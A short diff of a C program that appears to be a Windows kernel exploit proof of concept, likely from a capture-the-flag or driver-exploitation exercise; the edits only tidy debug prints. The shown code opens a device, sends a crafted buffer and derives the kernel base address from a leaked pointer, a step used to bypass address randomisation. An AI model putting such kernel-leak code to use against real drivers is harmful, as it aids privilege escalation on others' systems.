@@ -37,7 +37,7 @@ void hexdump(const void* data, size_t size)
 }
 
 int main(){
-    printf("Naup ~");
+
     HANDLE hDevice = CreateFileW(DeviceName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
 
     if (hDevice == INVALID_HANDLE_VALUE) {
@@ -45,7 +45,7 @@ int main(){
         return 1;
     }
 
-    printf("[!] Success open device");
+    printf("[!] Success open device\n");
 
     uintptr_t inputbuf1 = 0x8181818181818181;
     size_t KEY = 0x0;
@@ -92,8 +92,7 @@ int main(){
     uintptr_t kernel_base = leak_kernel - 0xb7b3c9; 
     printf("[!] Leak Kernel: 0x%llx\n", leak_kernel);
     printf("[!] Kernel Base: 0x%llx\n", kernel_base);
-    
-    printf("Naup ~");
+
     return 0;
 }
 
